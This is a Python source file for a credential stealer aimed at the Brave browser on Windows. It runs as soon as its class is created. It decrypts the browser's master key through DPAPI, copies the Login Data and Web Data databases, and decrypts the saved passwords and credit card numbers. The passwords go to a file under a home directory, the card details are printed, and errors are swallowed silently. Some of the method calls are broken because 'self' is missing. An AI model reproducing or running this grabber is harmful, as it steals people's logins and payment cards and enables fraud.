import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import datetime
from constants import MY_HOME


class Brave(object):

    def __init__(self) -> None:
        self.FileName = 116444736000000000
        self.NanoSeconds = 10000000
        self.bgrab()

    def ConvertDate(self, ft):
        utc = datetime.utcfromtimestamp(
            ((10 * int(ft)) - self.FileName) / self.NanoSeconds)
        return utc.strftime('%Y-%m-%d %H:%M:%S')

    def get_master_key(self):
        try:
            with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State',
                      "r", encoding='utf-8') as f:
                local_state = f.read()
                local_state = json.loads(local_state)
        except:
            exit()
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]  # removing DPAPI
        master_key = win32crypt.CryptUnprotectData(
            master_key, None, None, None, 0)[1]
        return master_key

    def decrypt_payload(self, cipher, payload):
        return cipher.decrypt(payload)

    def generate_cipher(self, aes_key, iv):
        return AES.new(aes_key, AES.MODE_GCM, iv)

    def decrypt_password(self, buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = generate_cipher(master_key, iv)
            decrypted_pass = decrypt_payload(cipher, payload)
            # remove suffix bytes
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception as e:
            return "Chrome < 80"

    def get_password(self):
        message = ""
        master_key = self.get_master_key()
        login_db = os.environ[
            'USERPROFILE'] + os.sep + r'AppData\Local\BraveSoftware\Brave-Browser\User Data\default\Login Data'
        try:
            shutil.copy2(login_db,
                         "Loginvault.db")  # making a temp copy since Login Data DB is locked while Chrome is running
        except:
            pass
        conn = sqlite3.connect("Loginvault.db")
        cursor = conn.cursor()

        try:
            cursor.execute(
                "SELECT action_url, username_value, password_value FROM logins")
            for r in cursor.fetchall():
                url = r[0]
                username = r[1]
                encrypted_password = r[2]
                decrypted_password = decrypt_password(
                    encrypted_password, master_key)
                if username != "" or decrypted_password != "":

                    message += "URL: " + url + "\nUser Name: " + username + \
                        "\nPassword: " + decrypted_password + "\n" + "*" * 10 + "\n"
            with open(MY_HOME + "brave.txt", "w") as f:
                f.write(message)
        except Exception as e:
            pass

        cursor.close()
        conn.close()
        try:
            os.remove("Loginvault.db")
        except Exception as e:
            pass

    def get_credit_cards(self):
        master_key = self.get_master_key()
        login_db = os.environ[
            'USERPROFILE'] + os.sep + r'AppData\Local\BraveSoftware\Brave-Browser\User Data\default\Web Data'
        try:
            shutil.copy2(login_db,
                         "CCvault.db")  # making a temp copy since Login Data DB is locked while Chrome is running
        except:
            pass
        conn = sqlite3.connect("CCvault.db")
        cursor = conn.cursor()

        try:
            cursor.execute("SELECT * FROM credit_cards")
            for r in cursor.fetchall():
                username = r[1]
                encrypted_password = r[4]
                decrypted_password = self.decrypt_password(
                    encrypted_password, master_key)
                expire_mon = r[2]
                expire_year = r[3]
                print(
                    "Name in Card: " + username + "\nNumber: " + decrypted_password + "\nExpire Month: " + str(
                        expire_mon) + "\nExpire Year: " + str(expire_year) + "\n" + "*" * 10 + "\n")

        except Exception as e:
            pass

        cursor.close()
        conn.close()
        try:
            os.remove("CCvault.db")
        except Exception as e:
            pass

    def bgrab(self):
        try:
            self.get_password()
            self.get_credit_cards()
        except:
            pass
